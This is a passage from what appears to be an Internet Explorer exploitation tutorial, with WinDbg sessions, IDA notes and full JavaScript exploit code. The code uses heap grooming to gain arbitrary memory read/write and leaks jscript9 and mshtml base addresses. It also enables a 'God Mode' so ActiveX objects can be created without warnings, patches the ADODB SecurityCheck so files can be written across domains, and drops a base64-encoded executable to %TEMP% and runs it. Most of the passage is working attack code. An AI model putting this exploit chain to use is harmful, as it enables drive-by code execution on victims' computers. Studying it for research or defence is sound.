+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  a = new Array(0x2000);
+  for (var i = 0; i &lt; 0x2000; ++i) {
+    a[i] = new Array((0x10000 - 0x20)/4);
+    for (var j = 0; j &lt; 0x1000; ++j)
+      a[i][j] = ActiveXObject;
+  }
+  alert("Done");
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Open it in IE and in WinDbg examine the memory at the address <span style="color: #00ff00;">0xadd0000</span> (or higher, if you want). The memory should be filled with the address of <span style="color: #00ff00;">ActiveXObject</span>. In my case, the address is <span style="color: #00ff00;">03411150</span>. Now let’s reach the address of <span style="color: #00ff00;">object</span>:</p><pre class="ignore:true">0:002&gt; ? poi(03411150+28)
+Evaluate expression: 51132616 = 030c38c8
+0:002&gt; ? poi(030c38c8+4)
+Evaluate expression: 51075360 = 030b5920
+0:002&gt; ? poi(030b5920+1f0)
+Evaluate expression: 0 = 00000000</pre><p>The address is <span style="color: #00ff00;">0</span>. Why? Look again at the following picture:</p><p>
+<a href="images/pic_41.png"><img src="images/pic_41.png" alt="pic_41" width="1447" height="1648"></a>
+<br> So, to initialize the pointer to <span style="color: #00ff00;">object</span>, we need to call <span style="color: #00ff00;">CanCreateObject</span>, i.e. we need to create an ActiveX object. Let’s change the javascript code this way:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  new ActiveXObject("WScript.shell");
+ 
+  a = new Array(0x2000);
+  for (var i = 0; i &lt; 0x2000; ++i) {
+    a[i] = new Array((0x10000 - 0x20)/4);
+    for (var j = 0; j &lt; 0x1000; ++j)
+      a[i][j] = ActiveXObject;
+  }
+  alert("Done");
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Repeat the process and try again to get the address of the object:</p><pre class="ignore:true">0:005&gt; ? poi(03411150+28)
+Evaluate expression: 51459608 = 03113618
+0:005&gt; ? poi(03113618+4)
+Evaluate expression: 51075360 = 030b5920
+0:005&gt; ? poi(030b5920+1f0)
+Evaluate expression: 6152384 = 005de0c0
+0:005&gt; dd 005de0c0
+005de0c0  6d0f55e0 00000001 6c4d7408 00589620
+005de0d0  6c532ac0 00000000 00000000 00000000
+005de0e0  00000005 00000000 3fd6264b 8c000000
+005de0f0  005579b8 005de180 005579b8 5e6c858f
+005de100  47600e22 33eafe9a 7371b617 005a0a08
+005de110  00000000 00000000 3fd62675 8c000000
+005de120  005882d0 005579e8 00556e00 5e6c858f
+005de130  47600e22 33eafe9a 7371b617 005ce140
+0:005&gt; ln 6d0f55e0
+(6d0f55e0)   MSHTML!s_apfnPlainTearoffVtable   |  (6d0f5ce8)   MSHTML!s_apfnEmbeddedDocTearoffVtable
+Exact matches:
+    MSHTML!s_apfnPlainTearoffVtable = &lt;no type information&gt;</pre><p>Perfect: now it works!</p><p>Now we can complete our javascript code:</p>
+    
+<pre><code class="language-js">    var old = read(mshtml+0xc555e0+0x14);
+
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God Mode On!
+    var shell = new ActiveXObject("WScript.shell");
+    write(mshtml+0xc555e0+0x14, old);                   // God Mode Off!
+
+    addr = get_addr(ActiveXObject);
+    var pp_obj = read(read(addr + 0x28) + 4) + 0x1f0;       // ptr to ptr to object
+</code></pre>
+    
+    <p>Note that we can use the “old” <em>God Mode</em> to create <span style="color: #00ff00;">WScript.shell</span> without showing the warning message.</p><p>Here’s the full code:</p>
+    
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function() {
+    alert("Starting!");
+
+    //-----------------------------------------------------
+    // From one-byte-write to full process space read/write
+    //-----------------------------------------------------
+ 
+    a = new Array();
+ 
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte ArrayBuffer (buf)
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    for (i = 0; i &lt; 0x300; ++i) {
+      a[i] = new Array(0x3c00);
+      if (i == 0x100)
+        buf = new ArrayBuffer(0x58);      // must be exactly 0x58!
+      for (j = 0; j &lt; a[i].length; ++j)
+        a[i][j] = 0x123;
+    }
+    
+    //    0x0:  ArrayDataHead
+    //   0x20:  array[0] address
+    //   0x24:  array[1] address
+    //   ...
+    // 0xf000:  Int32Array
+    // 0xf030:  Int32Array
+    //   ...
+    // 0xffc0:  Int32Array
+    // 0xfff0:  align data
+    for (; i &lt; 0x300 + 0x400; ++i) {
+      a[i] = new Array(0x3bf8)
+      for (j = 0; j &lt; 0x55; ++j)
+        a[i][j] = new Int32Array(buf)
+    }
+    
+    //            vftptr
+    // 0c0af000: 70583b60 031c98a0 00000000 00000003 00000004 00000000 20000016 08ce0020
+    // 0c0af020: 03133de0                                             array_len buf_addr
+    //          jsArrayBuf
+    alert("Set byte at 0c0af01b to 0x20");
+    
+    // Now let's find the Int32Array whose length we modified.
+    int32array = 0;
+    for (i = 0x300; i &lt; 0x300 + 0x400; ++i) {
+      for (j = 0; j &lt; 0x55; ++j) {
+        if (a[i][j].length != 0x58/4) {
+          int32array = a[i][j];
+          break;
+        }
+      }
+      if (int32array != 0)
+        break;
+    }
+    
+    if (int32array == 0) {
+      alert("Can't find int32array!");
+      window.location.reload();
+      return;
+    }
+ 
+    // This is just an example.
+    // The buffer of int32array starts at 03c1f178 and is 0x58 bytes.
+    // The next LargeHeapBlock, preceded by 8 bytes of header, starts at 03c1f1d8.
+    // The value in parentheses, at 03c1f178+0x60+0x24, points to the following
+    // LargeHeapBlock.
+    //
+    // 03c1f178: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f198: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f1b8: 00000000 00000000 00000000 00000000 00000000 00000000 014829e8 8c000000
+    // 03c1f1d8: 70796e18 00000003 08100000 00000010 00000001 00000000 00000004 0810f020
+    // 03c1f1f8: 08110000(03c1f238)00000000 00000001 00000001 00000000 03c15b40 08100000
+    // 03c1f218: 00000000 00000000 00000000 00000004 00000001 00000000 01482994 8c000000
+    // 03c1f238: ...
+
+    // We check that the structure above is correct (we check the first LargeHeapBlocks).
+    // 70796e18 = jscript9!LargeHeapBlock::`vftable' = jscript9 + 0x6e18
+    var vftptr1 = int32array[0x60/4],
+        vftptr2 = int32array[0x60*2/4],
+        vftptr3 = int32array[0x60*3/4],
+        nextPtr1 = int32array[(0x60+0x24)/4],
+        nextPtr2 = int32array[(0x60*2+0x24)/4],
+        nextPtr3 = int32array[(0x60*3+0x24)/4];
+    if (vftptr1 &amp; 0xffff != 0x6e18 || vftptr1 != vftptr2 || vftptr2 != vftptr3 ||
+        nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    
+    buf_addr = nextPtr1 - 0x60*2;
+    
+    // Now we modify int32array again to gain full address space read/write access.
+    if (int32array[(0x0c0af000+0x1c - buf_addr)/4] != buf_addr) {
+      alert("Error!");
+      window.location.reload();
+      return;
+    }  
+    int32array[(0x0c0af000+0x18 - buf_addr)/4] = 0x20000000;        // new length
+    int32array[(0x0c0af000+0x1c - buf_addr)/4] = 0;                 // new buffer address
+ 
+    function read(address) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        return int32array[address/4];
+      }
+      else {
+        alert("to debug");
+        // .### #... or ..## ##.. or ...# ###.
+        return (int32array[(address-k)/4] &gt;&gt; k*8) |
+               (int32array[(address-k+4)/4] &lt;&lt; (32 - k*8));
+      }
+    }
+    
+    function write(address, value) {
+      var k = address &amp; 3;
+      if (k == 0) {
+        // ####
+        int32array[address/4] = value;
+      }
+      else {
+        // .### #... or ..## ##.. or ...# ###.
+        alert("to debug");
+        var low = int32array[(address-k)/4];
+        var high = int32array[(address-k+4)/4];
+        var mask = (1 &lt;&lt; k*8) - 1;  // 0xff or 0xffff or 0xffffff
+        low = (low &amp; mask) | (value &lt;&lt; k*8);
+        high = (high &amp; (0xffffffff - mask)) | (value &gt;&gt; (32 - k*8));
+        int32array[(address-k)/4] = low;
+        int32array[(address-k+4)/4] = high;
+      }
+    }
+    
+    //---------
+    // God mode
+    //---------
+    
+    // At 0c0af000 we can read the vfptr of an Int32Array:
+    //   jscript9!Js::TypedArray&lt;int&gt;::`vftable' @ jscript9+3b60
+    jscript9 = read(0x0c0af000) - 0x3b60;
+    
+    // Now we need to determine the base address of MSHTML. We can create an HTML
+    // object and write its reference to the address 0x0c0af000-4 which corresponds
+    // to the last element of one of our arrays.
+    // Let's find the array at 0x0c0af000-4.
+    
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i)
+      a[i][0x3bf7] = 0;
+    
+    // We write 3 in the last position of one of our arrays. IE encodes the number x
+    // as 2*x+1 so that it can tell addresses (dword aligned) and numbers apart.
+    // Either we use an odd number or a valid address otherwise IE will crash in the
+    // following for loop.
+    write(0x0c0af000-4, 3);
+ 
+    leakArray = 0;
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i) {
+      if (a[i][0x3bf7] != 0) {
+        leakArray = a[i];
+        break;
+      }
+    }
+    if (leakArray == 0) {
+      alert("Can't find leakArray!");
+      window.location.reload();
+      return;
+    }
+    
+    function get_addr(obj) {
+      leakArray[0x3bf7] = obj;
+      return read(0x0c0af000-4, obj);
+    }
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable'
+    //      v
+    //   70792248 0c012b40 00000000 00000003
+    //   73b38b9a 00000000 00574230 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x58b9a
+    var addr = get_addr(document.createElement("div"));
+    mshtml = read(addr + 0x10) - 0x58b9a;
+
+    //                                                  vftable
+    //                                    +-----&gt; +------------------+
+    //                                    |       |                  |
+    //                                    |       |                  |
+    //                                    |  0x10:| jscript9+0x10705e| --&gt; "XCHG EAX,ESP | ADD EAX,71F84DC0 |
+    //                                    |       |                  |      MOV EAX,ESI | POP ESI | RETN"
+    //                                    |  0x14:| jscript9+0xdc164 | --&gt; "LEAVE | RET 4"
+    //                                    |       +------------------+
+    //                 object             |
+    // EAX ---&gt; +-------------------+     |
+    //          | vftptr            |-----+
+    //          | jscript9+0x15f800 | --&gt; "XOR EAX,EAX | RETN"
+    //          | jscript9+0xf3baf  | --&gt; "XCHG EAX,EDI | RETN"
+    //          | jscript9+0xdc361  | --&gt; "LEAVE | RET 4"
+    //          +-------------------+
+
+    var old = read(mshtml+0xc555e0+0x14);
+
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God Mode On!
+    var shell = new ActiveXObject("WScript.shell");
+    write(mshtml+0xc555e0+0x14, old);                   // God Mode Off!
+
+    addr = get_addr(ActiveXObject);
+    var pp_obj = read(read(addr + 0x28) + 4) + 0x1f0;       // ptr to ptr to object
+    
+    var old_objptr = read(pp_obj);
+    var old_vftptr = read(old_objptr);
+    
+    // Create the new vftable.
+    var new_vftable = new Int32Array(0x708/4);
+    for (var i = 0; i &lt; new_vftable.length; ++i)
+      new_vftable[i] = read(old_vftptr + i*4);
+    new_vftable[0x10/4] = jscript9+0x10705e;
+    new_vftable[0x14/4] = jscript9+0xdc164;
+    var new_vftptr = read(get_addr(new_vftable) + 0x1c);        // ptr to raw buffer of new_vftable
+    
+    // Create the new object.
+    var new_object = new Int32Array(4);
+    new_object[0] = new_vftptr;
+    new_object[1] = jscript9 + 0x15f800;
+    new_object[2] = jscript9 + 0xf3baf;
+    new_object[3] = jscript9 + 0xdc361;
+    var new_objptr = read(get_addr(new_object) + 0x1c);         // ptr to raw buffer of new_object
+    
+    function GodModeOn() {
+      write(pp_obj, new_objptr);
+    }
+    
+    function GodModeOff() {
+      write(pp_obj, old_objptr);
+    }
+    
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      bStream.SaveToFile(fname, 2);       // 2 = overwrites file if it already exists
+      tStream.Close();
+      bStream.Close();
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+       // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    createExe(fname, decode(runcalc));
+    shell.Exec(fname);
+
+    alert("All done!");
+  })();
+
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I snipped <span style="color: #00ff00;">runcalc</span>. You can download the full code from here: <a href="code/code2.zip">code2</a>.</p><p>If you open the html file in IE without using <span style="color: #00ccff;">SimpleServer</span>, everything should work fine. But if you use SimpleServer and open the page by going to <span style="color: #00ff00;">127.0.0.1</span> in IE, then it doesn’t work. We’ve seen this error message before:</p><h2>
+<a href="images/pic_35.png"><img src="images/pic_35.png" alt="pic_35" width="1569" height="723"></a>
+</h2><h2>Crossing Domains</h2><p>The line of code which throws the error is the one indicated here:</p>
+
+<pre><code class="language-js">    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      bStream.SaveToFile(fname, 2);       &lt;----------------------------- error here
+      tStream.Close();
+      bStream.Close();
+    }
+</code></pre>
+    
+    <p>The error message is “<span style="color: #00ff00;">SCRIPT3716: Safety settings on this computer prohibit accessing a data source on another domain.</span>“. So, let’s reload our html page using SimpleServer, change the length of the <span style="color: #00ff00;">Int32Array</span> and let the code throw the error. We note that some additional modules were loaded:</p><pre class="ignore:true">ModLoad: 0eb50000 0eb71000   C:\Windows\SysWOW64\wshom.ocx
+ModLoad: 749d0000 749e2000   C:\Windows\SysWOW64\MPR.dll
+ModLoad: 0eb80000 0ebaa000   C:\Windows\SysWOW64\ScrRun.dll
+ModLoad: 0ebb0000 0ec0f000   C:\Windows\SysWOW64\SXS.DLL
+ModLoad: 6e330000 6e429000   C:\Program Files (x86)\Common Files\System\ado\msado15.dll   &lt;-------------
+ModLoad: 72f00000 72f1f000   C:\Windows\SysWOW64\MSDART.DLL
+ModLoad: 6e570000 6e644000   C:\Program Files (x86)\Common Files\System\Ole DB\oledb32.dll
+ModLoad: 74700000 74717000   C:\Windows\SysWOW64\bcrypt.dll
+ModLoad: 72150000 72164000   C:\Program Files (x86)\Common Files\System\Ole DB\OLEDB32R.DLL
+ModLoad: 738c0000 738c2000   C:\Program Files (x86)\Common Files\System\ado\msader15.dll   &lt;-------------
+(15bc.398): C++ EH exception - code e06d7363 (first chance)
+(15bc.398): C++ EH exception - code e06d7363 (first chance)</pre><p>Two modules look particularly interesting: <span style="color: #00ff00;">msado15.dll</span> and <span style="color: #00ff00;">msader15.dll</span>. They’re located in the directory <span style="color: #00ff00;">ado</span>. It doesn’t take a genius to understand, or at least suspect, that those modules are related to <span style="color: #00ccff;">ADODB</span>.</p><p>Let’s see if we can find a function named <span style="color: #00ff00;">SaveToFile</span> in one of those two modules:</p><pre class="ignore:true">0:004&gt; x msad*!*savetofile*
+6e3e9ded          msado15!CStream::SaveToFile (&lt;no parameter info&gt;)
+6e3ccf19          msado15!CRecordset::SaveToFile (&lt;no parameter info&gt;)</pre><p>The first function seems to be what we’re looking for. Let’s put a breakpoint on it and reload the page. As we hoped, the execution breaks on <span style="color: #00ff00;">msado15!CStream::SaveToFile</span>. The name of the function suggests that the module is written in <span style="color: #00ccff;">C++</span> and that <span style="color: #00ff00;">SaveToFile</span> is a method of the class <span style="color: #00ff00;">CStream</span>. <span style="color: #00ff00;">ESI</span> should point to an object of that class:</p><pre class="ignore:true">0:007&gt; dd esi
+0edbb328  6e36fd28 6e36fd00 6e36fcf0 6e33acd8
+0edbb338  00000004 00000000 00000000 00000000
+0edbb348  00000000 00000000 00000000 6e36fce0
+0edbb358  6e33acc0 6e36fccc 00000000 00000904
+0edbb368  00000001 04e4c2bc 00000000 6e36fc94
+0edbb378  0edbb3b8 00000000 0edbb490 00000000
+0edbb388  00000001 ffffffff 00000000 00000000
+0edbb398  00000007 000004b0 00000000 00000000
+0:007&gt; ln poi(esi)
+(6e36fd28)   msado15!ATL::CComObject&lt;CStream&gt;::`vftable'   |  (6e36fdb8)   msado15!`CStream::_GetEntries'::`2'::_entries
+Exact matches:
+    msado15!ATL::CComObject&lt;CStream&gt;::`vftable' = &lt;no type information&gt;</pre><p>OK, it seems we’re on the right track.</p><p>Now let’s step through <span style="color: #00ff00;">SaveToFile</span> to find out where it fails. During our tracing we come across a very interesting call:</p><pre class="ignore:true">6e3ea0a9 0f8496000000    je      msado15!CStream::SaveToFile+0x358 (6e3ea145)
+6e3ea0af 50              push    eax
+6e3ea0b0 53              push    ebx
+6e3ea0b1 e88f940000      call    msado15!SecurityCheck (6e3f3545)     &lt;-------------------
+6e3ea0b6 83c408          add     esp,8
+6e3ea0b9 85c0            test    eax,eax
+6e3ea0bb 0f8d84000000    jge     msado15!CStream::SaveToFile+0x358 (6e3ea145)</pre><p><span style="color: #00ff00;">SecurityCheck</span> takes two parameters. Let’s start by examining the first one:</p><pre class="ignore:true">0:007&gt; dd eax
+04e4c2bc  00740068 00700074 002f003a 0031002f
+04e4c2cc  00370032 0030002e 0030002e 0031002e
+04e4c2dc  0000002f 00650067 00000000 6ff81c09
+04e4c2ec  8c000000 000000e4 00000000 00000000
+04e4c2fc  0024d46c 0024d46c 0024cff4 00000013
+04e4c30c  00000000 0000ffff 0c000001 00000000
+04e4c31c  00000000 6ff81c30 88000000 00000001
+04e4c32c  0024eee4 00000000 6d74682f 61202c6c</pre><p>Mmm… that looks like a <span style="color: #00ccff;">Unicode</span> string. Let’s see if we’re right:</p><pre class="ignore:true">0:007&gt; du eax
+04e4c2bc  "http://127.0.0.1/"</pre><p>That’s the <span style="color: #00ccff;">URL</span> of the page! What about <span style="color: #00ff00;">ebx</span>? Let’s see:</p><pre class="ignore:true">0:007&gt; dd ebx
+001d30c4  003a0043 0055005c 00650073 00730072
+001d30d4  0067005c 006e0061 00610064 0066006c
+001d30e4  0041005c 00700070 00610044 00610074
+001d30f4  004c005c 0063006f 006c0061 0054005c
+001d3104  006d0065 005c0070 006f004c 005c0077
+001d3114  00750072 0063006e 006c0061 002e0063
+001d3124  00780065 00000065 00000000 00000000
+001d3134  40080008 00000101 0075006f 00630072
+0:007&gt; du ebx
+001d30c4  "C:\Users\gandalf\AppData\Local\T"
+001d3104  "emp\Low\runcalc.exe"</pre><p>That’s the full path of the file we’re trying to create. Is it possible that those two URLs/paths are related to the <span style="color: #00ccff;">domains</span> the error message is referring to? Maybe the two domains are <span style="color: #00ff00;">http://127.0.0.1/</span> and <span style="color: #00ff00;">C:\</span>.</p><p>Probably, <span style="color: #00ff00;">SecurityCheck</span> checks that the two arguments represent the same domain.</p><p>Let’s see what happens if we modify the first parameter:</p><pre class="ignore:true">0:007&gt; ezu @eax "C:\\"
+0:007&gt; du @eax
+04e4c2bc  "C:\"</pre><p>The command <span style="color: #00ff00;">ezu</span> is used to <span style="color: #00ff00;">(e)dit a (z)ero-terminated (u)nicode string</span>. Now that we modified the second argument, let’s resume execution and see what happens.</p><p>The calculator pops up!!! Yeah!!!</p><p>Now we need a way to do the same from javascript. Is it possible? The best way to find out is to disassemble <span style="color: #00ff00;">msado15.dll</span> with IDA. Once in IDA, search for the function <span style="color: #00ff00;">SecurityCheck</span> (<span style="color: #00ff00;">CTRL+P</span> and click on <span style="color: #00ff00;">Search</span>), then click on the signature of <span style="color: #00ff00;">SecurityCheck</span>, press <span style="color: #00ff00;">CTRL+X</span> and double click on <span style="color: #00ff00;">CStream::SaveToFile</span>. Function <span style="color: #00ff00;">SaveToFile</span> is huge, but let’s not worry too much about it. We just need to analyze a very small portion of it. Let’s start by following the second argument:</p><p>
+<a href="images/pic_46.png"><img src="images/pic_46.png" alt="pic_46" width="1326" height="427"></a>
+<br> As we can see, <span style="color: #00ff00;">EAX</span> comes from <span style="color: #00ff00;">[ESI+44h]</span>. <span style="color: #00ff00;">ESI</span> should be the pointer <span style="color: #00ff00;">this</span>, which points to the current <span style="color: #00ff00;">CStream</span> object, but let’s make sure of it. In order to analyze the graph more comfortably, we can group all the nodes which are below the node with the call to <span style="color: #00ff00;">SecurityCheck</span>. To do so, zoom out by holding down <span style="color: #00ff00;">CTRL</span> while rotating the <span style="color: #00ccff;">mouse wheel</span>, select the nodes by holding down <span style="color: #00ff00;">CTRL</span> and using the mouse <span style="color: #00ccff;">left button</span>, and, finally, <span style="color: #00ccff;">right click</span> and select <span style="color: #00ff00;">Group nodes</span>. Here’s the reduced graph:</p><p>
+<a href="images/pic_47.png"><img src="images/pic_47.png" alt="pic_47" width="908" height="3094"></a>
+<br> It’s quite clear that <span style="color: #00ff00;">ESI</span> is indeed the pointer <span style="color: #00ff00;">this</span>. This is good because the variable <span style="color: #00ff00;">bStream</span> in our javascript probably points to the same object. Let’s find out if we’re right. To do so, let’s leak <span style="color: #00ff00;">bStream</span> by modifying our javascript code as follows:</p>
+
+<pre><code class="language-js">    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      alert(get_addr(bStream).toString(16));        // &lt;-----------------------------
+      bStream.SaveToFile(fname, 2);       // 2 = overwrites file if it already exists
+      tStream.Close();
+      bStream.Close();
+    }
+</code></pre>
+    
+    <p>Load the page in IE using SimpleServer and in WinDbg put a breakpoint on <span style="color: #00ff00;">SaveToFile</span>:</p><pre class="ignore:true">bm msado15!CStream::SaveToFile</pre><p>The alert box will pop up with the address of <span style="color: #00ff00;">bStream</span>. In my case, the address is <span style="color: #00ff00;">3663f40h</span>. After we close the alert box, the breakpoint is triggered. The address of the <span style="color: #00ff00;">CStream</span> is <span style="color: #00ff00;">ESI</span>, which in my case is <span style="color: #00ff00;">0e8cb328h</span>. Let’s examine the memory at the address <span style="color: #00ff00;">3663f40h</span> (our <span style="color: #00ff00;">bStream</span>):</p><pre class="ignore:true">0:007&gt; dd 3663f40h
+03663f40  71bb34c8 0e069a00 00000000 0e5db030
+03663f50  05a30f50 03663f14 032fafd4 00000000
+03663f60  71c69a44 00000008 00000009 00000000
+03663f70  0e8cb248 00000000 00000000 00000000
+03663f80  71c69a44 00000008 00000009 00000000
+03663f90  0e8cb328 00000000 00000000 00000000    &lt;------------- ptr to CStream!
+03663fa0  71c69a44 00000008 00000009 00000000
+03663fb0  0e8cb248 00000000 00000000 00000000</pre><p>We can see that at offset <span style="color: #00ff00;">0x50</span> we have the pointer to the object <span style="color: #00ff00;">CStream</span> whose <span style="color: #00ff00;">SaveToFile</span> method is called in <span style="color: #00ff00;">msado15.dll</span>. Let’s see if we can reach the string <span style="color: #00ff00;">http://127.0.0.1</span>, which is the one we’d like to modify:</p><pre class="ignore:true">0:007&gt; ? poi(3663f40+50)
+Evaluate expression: 244101928 = 0e8cb328
+0:007&gt; du poi(0e8cb328+44)
+04e5ff14  "http://127.0.0.1/"</pre><p>Perfect!</p><p>Now we must determine the exact bytes we want to overwrite the original string with. Here’s an easy way of doing that:</p><pre class="ignore:true">0:007&gt; ezu 04e5ff14 "C:\\"
+0:007&gt; dd 04e5ff14
+04e5ff14  003a0043 0000005c 002f003a 0031002f
+04e5ff24  00370032 0030002e 0030002e 0031002e
+04e5ff34  0000002f 00000000 00000000 58e7b7b9
+04e5ff44  8e000000 00000000 bf26faff 001a8001
+04e5ff54  00784700 00440041 0044004f 002e0042
+04e5ff64  00740053 00650072 006d0061 df6c0000
+04e5ff74  0000027d 58e7b7be 8c000000 00000000
+04e5ff84  00c6d95d 001c8001 00784300 00530057</pre><p>So we need to overwrite the string with <span style="color: #00ff00;">003a0043 0000005c</span>.</p><p>Change the code as follows:</p>
+
+<pre><code class="language-js">    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      
+      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      write(string_addr, 0x003a0043);       // 'C:'
+      write(string_addr + 4, 0x0000005c);   // '\'
+      bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      
+      tStream.Close();
+      bStream.Close();
+    }
+</code></pre>
+    
+    <p>Load the page in IE and, finally, everything should work fine!</p><p>Here’s the complete code for your convenience:</p>
+    
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function() {
+    alert("Starting!");
+    
+    CollectGarbage();
+
+    //-----------------------------------------------------
+    // From one-byte-write to full process space read/write
+    //-----------------------------------------------------
+ 
+    a = new Array();
+ 
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte ArrayBuffer (buf)
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    for (i = 0; i &lt; 0x300; ++i) {
+      a[i] = new Array(0x3c00);
+      if (i == 0x100)
+        buf = new ArrayBuffer(0x58);      // must be exactly 0x58!
+      for (j = 0; j &lt; a[i].length; ++j)
+        a[i][j] = 0x123;
+    }
+    
+    //    0x0:  ArrayDataHead
+    //   0x20:  array[0] address
+    //   0x24:  array[1] address
+    //   ...
+    // 0xf000:  Int32Array
+    // 0xf030:  Int32Array
+    //   ...
+    // 0xffc0:  Int32Array
+    // 0xfff0:  align data
+    for (; i &lt; 0x300 + 0x400; ++i) {
+      a[i] = new Array(0x3bf8)
+      for (j = 0; j &lt; 0x55; ++j)
+        a[i][j] = new Int32Array(buf)
+    }
+    
+    //            vftptr
+    // 0c0af000: 70583b60 031c98a0 00000000 00000003 00000004 00000000 20000016 08ce0020
+    // 0c0af020: 03133de0                                             array_len buf_addr
+    //          jsArrayBuf
+    alert("Set byte at 0c0af01b to 0x20");
+    
+    // Now let's find the Int32Array whose length we modified.
+    int32array = 0;
+    for (i = 0x300; i &lt; 0x300 + 0x400; ++i) {
+      for (j = 0; j &lt; 0x55; ++j) {
+        if (a[i][j].length != 0x58/4) {
+          int32array = a[i][j];
+          break;
+        }
+      }
+      if (int32array != 0)
+        break;
+    }
+    
+    if (int32array == 0) {
+      alert("Can't find int32array!");
+      window.location.reload();
+      return;
+    }
+ 
+    // This is just an example.
+    // The buffer of int32array starts at 03c1f178 and is 0x58 bytes.
+    // The next LargeHeapBlock, preceded by 8 bytes of header, starts at 03c1f1d8.
+    // The value in parentheses, at 03c1f178+0x60+0x24, points to the following
+    // LargeHeapBlock.
+    //
+    // 03c1f178: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f198: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f1b8: 00000000 00000000 00000000 00000000 00000000 00000000 014829e8 8c000000
+    // 03c1f1d8: 70796e18 00000003 08100000 00000010 00000001 00000000 00000004 0810f020
+    // 03c1f1f8: 08110000(03c1f238)00000000 00000001 00000001 00000000 03c15b40 08100000
+    // 03c1f218: 00000000 00000000 00000000 00000004 00000001 00000000 01482994 8c000000
+    // 03c1f238: ...
+
+    // We check that the structure above is correct (we check the first LargeHeapBlocks).
+    // 70796e18 = jscript9!LargeHeapBlock::`vftable' = jscript9 + 0x6e18
+    var vftptr1 = int32array[0x60/4],
+        vftptr2 = int32array[0x60*2/4],
+        vftptr3 = int32array[0x60*3/4],
+        nextPtr1 = int32array[(0x60+0x24)/4],
+        nextPtr2 = int32array[(0x60*2+0x24)/4],
